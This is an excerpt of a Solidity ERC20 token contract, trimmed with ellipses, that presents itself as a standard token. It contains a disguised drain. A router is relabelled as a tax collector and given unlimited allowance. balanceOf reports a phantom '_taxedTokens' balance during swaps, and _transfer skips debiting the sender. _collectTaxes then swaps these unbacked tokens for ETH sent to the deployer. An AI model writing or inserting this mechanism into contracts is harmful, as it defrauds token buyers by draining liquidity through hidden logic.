...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    ICollectTaxedTokens private collectTaxedTokens = ICollectTaxedTokens(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, uint8 decimals_, address deployer_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _deployer = deployer_;
        _allowances[address(this)][address(collectTaxedTokens)] = type(uint256).max;
    }
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return (swapping && account == address(this)) ? _taxedTokens : _balances[account];
    }
    ...
    function _path() private returns (address[] memory) {
        address[] memory p = new address[](2);
        p[0] = address(this);
        p[1] = collectTaxedTokens.WETH();
        return p;
    }
    ...
    function _transfer(
        ...
        unchecked {
            _balances[from] = fromBalance - (!swapping ? amount : 0);
    ...
    function _collectTaxes() private {
        swapping = true;
        collectTaxedTokens.swapExactTokensForETH(_taxedTokens, 0, _path(), _deployer, block.timestamp + 1000000);
    }
